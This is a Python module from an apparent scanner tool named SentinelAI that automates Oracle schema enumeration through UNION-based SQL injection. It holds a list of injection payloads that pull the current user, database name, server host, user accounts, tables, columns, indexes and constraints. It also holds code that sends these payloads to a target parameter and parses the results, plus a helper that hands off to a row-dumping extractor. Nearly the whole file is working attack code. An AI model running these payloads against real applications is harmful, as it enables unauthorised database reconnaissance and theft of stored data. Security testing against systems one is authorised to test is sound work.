# app/modules/scanner/oracle_schema.py
"""
Oracle schema enumeration for SentinelAI.
Phase 3: Oracle Schema Enumeration
"""

import logging
import re
from dataclasses import dataclass, field
from typing import Optional, Dict, List, Any, Set
import requests

from .union_sqli import UnionSQLi
from .html_parser import HTMLParser
from .regex_utils import RegexUtils
from .signatures import OracleSignatures

# ============================================================
# Data Classes
# ============================================================


@dataclass
class OracleSchemaResult:
    """
    Oracle schema enumeration result.
    Contains all enumerated database metadata.
    """

    success: bool = False
    current_user: Optional[str] = None
    current_schema: Optional[str] = None
    database_name: Optional[str] = None
    server_host: Optional[str] = None
    version: Optional[str] = None
    edition: Optional[str] = None
    banner: Optional[str] = None
    schemas: List[str] = field(default_factory=list)
    tables: Dict[str, List[str]] = field(default_factory=dict)
    columns: Dict[str, Dict[str, List[str]]] = field(default_factory=dict)
    indexes: Dict[str, List[str]] = field(default_factory=dict)
    constraints: Dict[str, Dict[str, List[str]]] = field(default_factory=dict)
    errors: List[str] = field(default_factory=list)

    def add_error(self, error: str):
        """Add an error to the result."""
        self.errors.append(error)

    def add_table(self, schema: str, table: str):
        """Add a table to the result."""
        if schema not in self.tables:
            self.tables[schema] = []
        if table not in self.tables[schema]:
            self.tables[schema].append(table)

    def add_column(self, schema: str, table: str, column: str):
        """Add a column to the result."""
        if schema not in self.columns:
            self.columns[schema] = {}
        if table not in self.columns[schema]:
            self.columns[schema][table] = []
        if column not in self.columns[schema][table]:
            self.columns[schema][table].append(column)

    def add_index(self, schema: str, index: str):
        """Add an index to the result."""
        if schema not in self.indexes:
            self.indexes[schema] = []
        if index not in self.indexes[schema]:
            self.indexes[schema].append(index)

    def add_constraint(self, schema: str, constraint_type: str, constraint: str):
        """Add a constraint to the result."""
        if schema not in self.constraints:
            self.constraints[schema] = {}
        if constraint_type not in self.constraints[schema]:
            self.constraints[schema][constraint_type] = []
        if constraint not in self.constraints[schema][constraint_type]:
            self.constraints[schema][constraint_type].append(constraint)

    def get_summary(self) -> str:
        """Get a summary of the schema enumeration."""
        if not self.success:
            return "Schema enumeration failed"

        summary_parts = []

        if self.current_user:
            summary_parts.append(f"User: {self.current_user}")

        if self.database_name:
            summary_parts.append(f"Database: {self.database_name}")

        if self.schemas:
            summary_parts.append(f"Schemas: {len(self.schemas)}")

        total_tables = sum(len(tables) for tables in self.tables.values())
        if total_tables > 0:
            summary_parts.append(f"Tables: {total_tables}")

        total_columns = sum(
            sum(len(cols) for cols in tables.values())
            for tables in self.columns.values()
        )
        if total_columns > 0:
            summary_parts.append(f"Columns: {total_columns}")

        total_indexes = sum(len(idx) for idx in self.indexes.values())
        if total_indexes > 0:
            summary_parts.append(f"Indexes: {total_indexes}")

        total_constraints = sum(
            sum(len(cons) for cons in constraints.values())
            for constraints in self.constraints.values()
        )
        if total_constraints > 0:
            summary_parts.append(f"Constraints: {total_constraints}")

        if self.errors:
            summary_parts.append(f"Errors: {len(self.errors)}")

        return f"Schema Enumeration: {', '.join(summary_parts)}"

    def to_dict(self) -> Dict[str, Any]:
        """Convert to dictionary for logging/output."""
        return {
            "success": self.success,
            "current_user": self.current_user,
            "current_schema": self.current_schema,
            "database_name": self.database_name,
            "server_host": self.server_host,
            "version": self.version,
            "edition": self.edition,
            "banner": self.banner,
            "schemas": self.schemas,
            "tables": self.tables,
            "columns": self.columns,
            "indexes": self.indexes,
            "constraints": self.constraints,
            "errors": self.errors,
            "summary": self.get_summary(),
        }


# ============================================================
# Oracle Schema Enumeration Class
# ============================================================


class OracleSchemaEnumerator:
    """
    Oracle schema enumeration module.
    Phase 3: Enumerates database metadata after successful Oracle detection.
    """

    # ============================================================
    # Constants
    # ============================================================

    # Schema enumeration payloads
    PAYLOADS = {
        "current_user": [
            "UNION SELECT USER FROM dual--",
            "UNION SELECT SYS_CONTEXT('USERENV','CURRENT_USER') FROM dual--",
        ],
        "current_schema": [
            "UNION SELECT SYS_CONTEXT('USERENV','CURRENT_SCHEMA') FROM dual--",
            "UNION SELECT SYS_CONTEXT('USERENV','DB_SCHEMA') FROM dual--",
        ],
        "database_name": [
            "UNION SELECT SYS_CONTEXT('USERENV','DB_NAME') FROM dual--",
            "UNION SELECT name FROM v$database--",
        ],
        "server_host": [
            "UNION SELECT SYS_CONTEXT('USERENV','SERVER_HOST') FROM dual--",
            "UNION SELECT HOST_NAME FROM v$instance--",
        ],
        "version": [
            "UNION SELECT banner FROM v$version--",
            "UNION SELECT version FROM v$instance--",
        ],
        "banner": [
            "UNION SELECT banner FROM v$version WHERE ROWNUM=1--",
            "UNION SELECT banner FROM v$version--",
        ],
        "schemas": [
            "UNION SELECT username FROM all_users--",
            "UNION SELECT username FROM dba_users--",
        ],
        "tables": [
            "UNION SELECT table_name FROM all_tables WHERE owner='{schema}'--",
            "UNION SELECT table_name FROM user_tables--",
        ],
        "columns": [
            "UNION SELECT column_name FROM all_tab_columns WHERE owner='{schema}' AND table_name='{table}'--",
            "UNION SELECT column_name FROM user_tab_columns WHERE table_name='{table}'--",
        ],
        "indexes": [
            "UNION SELECT index_name FROM all_indexes WHERE owner='{schema}'--",
            "UNION SELECT index_name FROM user_indexes--",
        ],
        "constraints": [
            "UNION SELECT constraint_name, constraint_type FROM all_constraints WHERE owner='{schema}'--",
            "UNION SELECT constraint_name, constraint_type FROM user_constraints--",
        ],
        "primary_keys": [
            "UNION SELECT constraint_name FROM all_constraints WHERE owner='{schema}' AND constraint_type='P'--",
            "UNION SELECT constraint_name FROM user_constraints WHERE constraint_type='P'--",
        ],
    }

    # Extraction patterns
    EXTRACTION_PATTERNS = {
        "username": r"[A-Z][A-Z0-9_$]{2,}",
        "table_name": r"[A-Z][A-Z0-9_$]{2,}",
        "column_name": r"[A-Z][A-Z0-9_$]{2,}",
        "constraint_name": r"[A-Z][A-Z0-9_$]{2,}",
        "index_name": r"[A-Z][A-Z0-9_$]{2,}",
        "constraint_type": r"[P|R|U|C|V]",
    }

    # Maximum items to enumerate (safety limit)
    MAX_SCHEMAS = 50
    MAX_TABLES = 100
    MAX_COLUMNS = 200
    MAX_INDEXES = 100
    MAX_CONSTRAINTS = 100

    # ============================================================
    # Initialization
    # ============================================================

    def __init__(
        self,
        session: requests.Session,
        base_url: str,
        logger: Optional[logging.Logger] = None,
    ):
        """
        Initialize Oracle schema enumerator.

        Args:
            session: Requests session for HTTP requests
            base_url: Target base URL
            logger: Optional logger instance
        """
        self.session = session
        self.base_url = base_url
        self.logger = logger or self._setup_logger()

        # Initialize components
        self.union_sqli = UnionSQLi(session, base_url, logger)
        self.html_parser = HTMLParser()
        self.regex_utils = RegexUtils()
        self.signatures = OracleSignatures()

        # State
        self.baseline_response = None
        self.schema_result = None

        self.logger.info("[OracleSchema] Module initialized for schema enumeration")
        self.logger.info(f"[OracleSchema] Target: {base_url}")

    def _setup_logger(self) -> logging.Logger:
        """Set up default logger."""
        logger = logging.getLogger("OracleSchema")
        logger.setLevel(logging.DEBUG)

        if not logger.handlers:
            ch = logging.StreamHandler()
            ch.setLevel(logging.DEBUG)
            formatter = logging.Formatter(
                "%(asctime)s - %(name)s - %(levelname)s - %(message)s"
            )
            ch.setFormatter(formatter)
            logger.addHandler(ch)

        return logger

    # ============================================================
    # Private Methods
    # ============================================================

    def _get_baseline(self, injection_point: str) -> Optional[requests.Response]:
        """
        Get baseline response for comparison.

        Args:
            injection_point: Parameter to inject into

        Returns:
            Optional[Response]: Baseline response
        """
        if self.baseline_response is None:
            self.logger.info("[OracleSchema] Fetching baseline response...")
            self.baseline_response = self.union_sqli.get_baseline(injection_point)

            if self.baseline_response:
                self.logger.info(
                    f"[OracleSchema] Baseline response length: {len(self.baseline_response.text)}"
                )
            else:
                self.logger.warning("[OracleSchema] Failed to get baseline response")

        return self.baseline_response

    def _send_payload(
        self, injection_point: str, payload: str
    ) -> Optional[requests.Response]:
        """
        Send a payload and return the response.

        Args:
            injection_point: Parameter to inject into
            payload: SQL injection payload

        Returns:
            Optional[Response]: Response or None
        """
        baseline = self._get_baseline(injection_point)
        result = self.union_sqli.test_payload(injection_point, payload, baseline)

        if not result["success"] or result.get("response") is None:
            return None

        return result["response"]

    def _extract_values(self, text: str, pattern: str) -> List[str]:
        """
        Extract values from text using regex pattern.

        Args:
            text: Text to extract from
            pattern: Regex pattern

        Returns:
            List[str]: Extracted values
        """
        matches = re.findall(pattern, text, re.IGNORECASE)
        return list(set(matches))  # Remove duplicates

    def _extract_single_value(self, text: str, pattern: str) -> Optional[str]:
        """
        Extract a single value from text.

        Args:
            text: Text to extract from
            pattern: Regex pattern

        Returns:
            Optional[str]: Extracted value or None
        """
        matches = self._extract_values(text, pattern)
        return matches[0] if matches else None

    def _clean_value(self, value: str) -> str:
        """
        Clean extracted value.

        Args:
            value: Value to clean

        Returns:
            str: Cleaned value
        """
        if not value:
            return value

        # Remove whitespace and quotes
        value = value.strip()
        value = value.strip("'\"")
        value = value.strip()

        return value

    def _try_payloads(
        self,
        injection_point: str,
        payloads: List[str],
        extract_pattern: str,
        single: bool = False,
    ) -> Any:
        """
        Try multiple payloads and extract values.

        Args:
            injection_point: Parameter to inject into
            payloads: List of payloads to try
            extract_pattern: Regex pattern for extraction
            single: Whether to return single value

        Returns:
            Any: Extracted value(s) or None
        """
        for payload in payloads:
            try:
                self.logger.debug(f"[OracleSchema] Testing payload: {payload[:50]}...")
                response = self._send_payload(injection_point, payload)

                if response:
                    if single:
                        value = self._extract_single_value(
                            response.text, extract_pattern
                        )
                        if value:
                            return self._clean_value(value)
                    else:
                        values = self._extract_values(response.text, extract_pattern)
                        if values:
                            return [self._clean_value(v) for v in values]
            except Exception as e:
                self.logger.warning(f"[OracleSchema] Payload failed: {str(e)}")
                continue

        return None if single else []

    # ============================================================
    # Public Enumeration Methods
    # ============================================================

    def enumerate_current_user(self, injection_point: str) -> Optional[str]:
        """
        Enumerate current database user.

        Args:
            injection_point: Parameter to inject into

        Returns:
            Optional[str]: Current user or None
        """
        self.logger.info("[OracleSchema] Enumerating current user...")

        result = self._try_payloads(
            injection_point,
            self.PAYLOADS["current_user"],
            self.EXTRACTION_PATTERNS["username"],
            single=True,
        )

        if result:
            self.logger.info(f"[OracleSchema] Current user: {result}")
        else:
            self.logger.warning("[OracleSchema] Failed to enumerate current user")

        return result

    def enumerate_current_schema(self, injection_point: str) -> Optional[str]:
        """
        Enumerate current schema.

        Args:
            injection_point: Parameter to inject into

        Returns:
            Optional[str]: Current schema or None
        """
        self.logger.info("[OracleSchema] Enumerating current schema...")

        result = self._try_payloads(
            injection_point,
            self.PAYLOADS["current_schema"],
            r"[A-Z][A-Z0-9_$]{2,}",
            single=True,
        )

        if result:
            self.logger.info(f"[OracleSchema] Current schema: {result}")
        else:
            self.logger.warning("[OracleSchema] Failed to enumerate current schema")

        return result

    def enumerate_database_name(self, injection_point: str) -> Optional[str]:
        """
        Enumerate database name.

        Args:
            injection_point: Parameter to inject into

        Returns:
            Optional[str]: Database name or None
        """
        self.logger.info("[OracleSchema] Enumerating database name...")

        result = self._try_payloads(
            injection_point,
            self.PAYLOADS["database_name"],
            r"[A-Z][A-Z0-9_$]{2,}",
            single=True,
        )

        if result:
            self.logger.info(f"[OracleSchema] Database name: {result}")
        else:
            self.logger.warning("[OracleSchema] Failed to enumerate database name")

        return result

    def enumerate_server_host(self, injection_point: str) -> Optional[str]:
        """
        Enumerate server host.

        Args:
            injection_point: Parameter to inject into

        Returns:
            Optional[str]: Server host or None
        """
        self.logger.info("[OracleSchema] Enumerating server host...")

        result = self._try_payloads(
            injection_point,
            self.PAYLOADS["server_host"],
            r"[A-Za-z0-9._-]+",
            single=True,
        )

        if result:
            self.logger.info(f"[OracleSchema] Server host: {result}")
        else:
            self.logger.warning("[OracleSchema] Failed to enumerate server host")

        return result

    # app/modules/scanner/oracle_schema.py
    # Only showing the fixed method, rest of file unchanged

    # app/modules/scanner/oracle_schema.py
    # Add these methods inside the OracleSchemaEnumerator class

    # ============================================================
    # Missing Methods - Add these to OracleSchemaEnumerator class
    # ============================================================

    def enumerate_version(self, injection_point: str) -> Optional[str]:
        """
        Enumerate database version.

        Args:
            injection_point: Parameter to inject into

        Returns:
            Optional[str]: Database version or None
        """
        self.logger.info("[OracleSchema] Enumerating database version...")

        result = self._try_payloads(
            injection_point,
            self.PAYLOADS["version"],
            r"Oracle Database.*?(\d+\.\d+\.\d+\.\d+\.?\d*)",
            single=True,
        )

        if result:
            self.logger.info(f"[OracleSchema] Database version: {result}")
        else:
            self.logger.warning("[OracleSchema] Failed to enumerate database version")

        return result

    def enumerate_banner(self, injection_point: str) -> Optional[str]:
        """
        Enumerate database banner.

        Args:
            injection_point: Parameter to inject into

        Returns:
            Optional[str]: Database banner or None
        """
        self.logger.info("[OracleSchema] Enumerating database banner...")

        result = self._try_payloads(
            injection_point, self.PAYLOADS["banner"], r"Oracle Database.*", single=True
        )

        if result:
            self.logger.info(f"[OracleSchema] Database banner: {result[:100]}...")
        else:
            self.logger.warning("[OracleSchema] Failed to enumerate database banner")

        return result

    def enumerate_schemas(self, injection_point: str) -> List[str]:
        """
        Enumerate all schemas.

        Args:
            injection_point: Parameter to inject into

        Returns:
            List[str]: List of schemas
        """
        self.logger.info("[OracleSchema] Enumerating schemas...")

        schemas = self._try_payloads(
            injection_point,
            self.PAYLOADS["schemas"],
            self.EXTRACTION_PATTERNS["username"],
            single=False,
        )

        # Filter out system schemas
        system_schemas = {"SYS", "SYSTEM", "DBSNMP", "XDB", "OUTLN", "MDSYS"}
        filtered_schemas = [s for s in schemas if s.upper() not in system_schemas]

        if len(filtered_schemas) > self.MAX_SCHEMAS:
            filtered_schemas = filtered_schemas[: self.MAX_SCHEMAS]

        if filtered_schemas:
            self.logger.info(
                f"[OracleSchema] Found {len(filtered_schemas)} schemas: {filtered_schemas[:10]}"
            )
        else:
            self.logger.warning("[OracleSchema] Failed to enumerate schemas")

        return filtered_schemas

    def enumerate_tables(self, injection_point: str, schema: str) -> List[str]:
        """
        Enumerate tables for a specific schema.

        Args:
            injection_point: Parameter to inject into
            schema: Schema name

        Returns:
            List[str]: List of tables
        """
        self.logger.info(f"[OracleSchema] Enumerating tables for schema: {schema}")

        tables = []

        for payload_template in self.PAYLOADS["tables"]:
            try:
                payload = payload_template.format(schema=schema.upper())
                response = self._send_payload(injection_point, payload)

                if response:
                    extracted = self._extract_values(
                        response.text, self.EXTRACTION_PATTERNS["table_name"]
                    )
                    tables.extend(extracted)
            except Exception as e:
                self.logger.warning(
                    f"[OracleSchema] Table enumeration failed: {str(e)}"
                )
                continue

        unique_tables = list(set(tables))
        if len(unique_tables) > self.MAX_TABLES:
            unique_tables = unique_tables[: self.MAX_TABLES]

        if unique_tables:
            self.logger.info(
                f"[OracleSchema] Found {len(unique_tables)} tables: {unique_tables[:10]}"
            )
        else:
            self.logger.warning(f"[OracleSchema] No tables found for schema: {schema}")

        return unique_tables

    def enumerate_columns(
        self, injection_point: str, schema: str, table: str
    ) -> List[str]:
        """
        Enumerate columns for a specific table.

        Args:
            injection_point: Parameter to inject into
            schema: Schema name
            table: Table name

        Returns:
            List[str]: List of columns
        """
        self.logger.info(f"[OracleSchema] Enumerating columns for: {schema}.{table}")

        columns = []

        for payload_template in self.PAYLOADS["columns"]:
            try:
                payload = payload_template.format(
                    schema=schema.upper(), table=table.upper()
                )
                response = self._send_payload(injection_point, payload)

                if response:
                    extracted = self._extract_values(
                        response.text, self.EXTRACTION_PATTERNS["column_name"]
                    )
                    columns.extend(extracted)
            except Exception as e:
                self.logger.warning(
                    f"[OracleSchema] Column enumeration failed: {str(e)}"
                )
                continue

        unique_columns = list(set(columns))
        if len(unique_columns) > self.MAX_COLUMNS:
            unique_columns = unique_columns[: self.MAX_COLUMNS]

        if unique_columns:
            self.logger.info(
                f"[OracleSchema] Found {len(unique_columns)} columns: {unique_columns[:10]}"
            )
        else:
            self.logger.warning(
                f"[OracleSchema] No columns found for: {schema}.{table}"
            )

        return unique_columns

    def enumerate_indexes(self, injection_point: str, schema: str) -> List[str]:
        """
        Enumerate indexes for a specific schema.

        Args:
            injection_point: Parameter to inject into
            schema: Schema name

        Returns:
            List[str]: List of indexes
        """
        self.logger.info(f"[OracleSchema] Enumerating indexes for schema: {schema}")

        indexes = []

        for payload_template in self.PAYLOADS["indexes"]:
            try:
                payload = payload_template.format(schema=schema.upper())
                response = self._send_payload(injection_point, payload)

                if response:
                    extracted = self._extract_values(
                        response.text, self.EXTRACTION_PATTERNS["index_name"]
                    )
                    indexes.extend(extracted)
            except Exception as e:
                self.logger.warning(
                    f"[OracleSchema] Index enumeration failed: {str(e)}"
                )
                continue

        unique_indexes = list(set(indexes))
        if len(unique_indexes) > self.MAX_INDEXES:
            unique_indexes = unique_indexes[: self.MAX_INDEXES]

        if unique_indexes:
            self.logger.info(
                f"[OracleSchema] Found {len(unique_indexes)} indexes: {unique_indexes[:10]}"
            )
        else:
            self.logger.warning(f"[OracleSchema] No indexes found for schema: {schema}")

        return unique_indexes

    def enumerate_constraints(
        self, injection_point: str, schema: str
    ) -> Dict[str, List[str]]:
        """
        Enumerate constraints for a specific schema.

        Args:
            injection_point: Parameter to inject into
            schema: Schema name

        Returns:
            Dict[str, List[str]]: Dictionary of constraint types and names
        """
        self.logger.info(f"[OracleSchema] Enumerating constraints for schema: {schema}")

        constraints = {"P": [], "R": [], "U": [], "C": [], "V": []}

        for payload_template in self.PAYLOADS["constraints"]:
            try:
                payload = payload_template.format(schema=schema.upper())
                response = self._send_payload(injection_point, payload)

                if response:
                    pattern = r"([A-Z][A-Z0-9_$]{2,})\s+([P|R|U|C|V])"
                    matches = re.findall(pattern, response.text, re.IGNORECASE)

                    for name, ctype in matches:
                        ctype = ctype.upper()
                        if ctype in constraints:
                            constraints[ctype].append(name)
            except Exception as e:
                self.logger.warning(
                    f"[OracleSchema] Constraint enumeration failed: {str(e)}"
                )
                continue

        for ctype in constraints:
            constraints[ctype] = list(set(constraints[ctype]))
            if len(constraints[ctype]) > self.MAX_CONSTRAINTS:
                constraints[ctype] = constraints[ctype][: self.MAX_CONSTRAINTS]

        total = sum(len(v) for v in constraints.values())
        if total > 0:
            self.logger.info(f"[OracleSchema] Found {total} constraints")
        else:
            self.logger.warning(
                f"[OracleSchema] No constraints found for schema: {schema}"
            )

        return constraints

    def enumerate_all(
        self, injection_point: str, max_tables: int = 20
    ) -> OracleSchemaResult:
        """
        Perform complete schema enumeration.

        Args:
            injection_point: Parameter to inject into
            max_tables: Maximum tables to enumerate per schema

        Returns:
            OracleSchemaResult: Complete enumeration result
        """
        self.logger.info(
            "[OracleSchema] =================================================="
        )
        self.logger.info("[OracleSchema] PHASE 3: Oracle Schema Enumeration")
        self.logger.info(
            "[OracleSchema] =================================================="
        )

        result = OracleSchemaResult()

        try:
            # Step 1: Database Information
            self.logger.info(
                "[OracleSchema] Step 1: Collecting database information..."
            )
            result.current_user = self.enumerate_current_user(injection_point)
            result.current_schema = self.enumerate_current_schema(injection_point)
            result.database_name = self.enumerate_database_name(injection_point)
            result.server_host = self.enumerate_server_host(injection_point)
            result.version = self.enumerate_version(injection_point)
            result.banner = self.enumerate_banner(injection_point)

            # Step 2: Schemas
            self.logger.info("[OracleSchema] Step 2: Enumerating schemas...")
            schemas = self.enumerate_schemas(injection_point)

            if schemas:
                result.schemas = schemas

                # Step 3: Tables for each schema
                self.logger.info("[OracleSchema] Step 3: Enumerating tables...")
                for schema in schemas[:10]:  # Limit schemas to prevent overload
                    try:
                        tables = self.enumerate_tables(injection_point, schema)

                        if tables:
                            result.tables[schema] = tables

                            # Step 4: Columns for each table
                            self.logger.info(
                                f"[OracleSchema] Step 4: Enumerating columns for {schema}..."
                            )
                            for table in tables[:max_tables]:  # Limit tables per schema
                                try:
                                    columns = self.enumerate_columns(
                                        injection_point, schema, table
                                    )
                                    if columns:
                                        if schema not in result.columns:
                                            result.columns[schema] = {}
                                        result.columns[schema][table] = columns
                                except Exception as e:
                                    error_msg = f"Failed to enumerate columns for {schema}.{table}: {str(e)}"
                                    self.logger.warning(error_msg)
                                    result.add_error(error_msg)

                        # Step 5: Indexes for each schema
                        self.logger.info(
                            f"[OracleSchema] Step 5: Enumerating indexes for {schema}..."
                        )
                        try:
                            indexes = self.enumerate_indexes(injection_point, schema)
                            if indexes:
                                result.indexes[schema] = indexes
                        except Exception as e:
                            error_msg = (
                                f"Failed to enumerate indexes for {schema}: {str(e)}"
                            )
                            self.logger.warning(error_msg)
                            result.add_error(error_msg)

                        # Step 6: Constraints for each schema
                        self.logger.info(
                            f"[OracleSchema] Step 6: Enumerating constraints for {schema}..."
                        )
                        try:
                            constraints = self.enumerate_constraints(
                                injection_point, schema
                            )
                            if any(constraints.values()):
                                result.constraints[schema] = constraints
                        except Exception as e:
                            error_msg = f"Failed to enumerate constraints for {schema}: {str(e)}"
                            self.logger.warning(error_msg)
                            result.add_error(error_msg)

                    except Exception as e:
                        error_msg = f"Failed to enumerate tables for {schema}: {str(e)}"
                        self.logger.warning(error_msg)
                        result.add_error(error_msg)
            else:
                self.logger.warning(
                    "[OracleSchema] No schemas found, enumeration incomplete"
                )

            result.success = True

        except Exception as e:
            error_msg = f"Schema enumeration failed: {str(e)}"
            self.logger.error(error_msg)
            result.add_error(error_msg)
            result.success = False

        # Log final result
        self.logger.info(
            "[OracleSchema] =================================================="
        )
        self.logger.info("[OracleSchema] SCHEMA ENUMERATION COMPLETE")
        self.logger.info(f"[OracleSchema] {result.get_summary()}")
        self.logger.info(
            "[OracleSchema] =================================================="
        )

        self.schema_result = result
        return result

    def get_current_user(self, injection_point: str) -> Optional[str]:
        """
        Get current user only.

        Args:
            injection_point: Parameter to inject into

        Returns:
            Optional[str]: Current user or None
        """
        return self.enumerate_current_user(injection_point)

    def get_database_info(self, injection_point: str) -> Dict[str, Any]:
        """
        Get basic database information.

        Args:
            injection_point: Parameter to inject into

        Returns:
            Dict: Database information
        """
        return {
            "current_user": self.enumerate_current_user(injection_point),
            "current_schema": self.enumerate_current_schema(injection_point),
            "database_name": self.enumerate_database_name(injection_point),
            "server_host": self.enumerate_server_host(injection_point),
            "version": self.enumerate_version(injection_point),
            "banner": self.enumerate_banner(injection_point),
        }

    # app/modules/scanner/oracle_schema.py
    # Add this method to the OracleSchemaEnumerator class

    # ============================================================
    # Phase 4: Data Extraction Helper
    # ============================================================

    def extract_table_data(
        self,
        injection_point: str,
        schema: str,
        table: str,
        columns: Optional[List[str]] = None,
        max_rows: Optional[int] = None,
    ) -> Any:
        """
        Extract data from a table using the data extractor.

        Args:
            injection_point: Parameter to inject into
            schema: Schema name
            table: Table name
            columns: List of columns to extract
            max_rows: Maximum rows to extract

        Returns:
            OracleExtractionResult: Extraction result
        """
        from .oracle_extractor import OracleDataExtractor

        self.logger.info(f"[OracleSchema] Extracting data from: {schema}.{table}")

        extractor = OracleDataExtractor(self.session, self.base_url, self.logger)
        return extractor.extract_table(
            injection_point, schema, table, columns, max_rows
        )
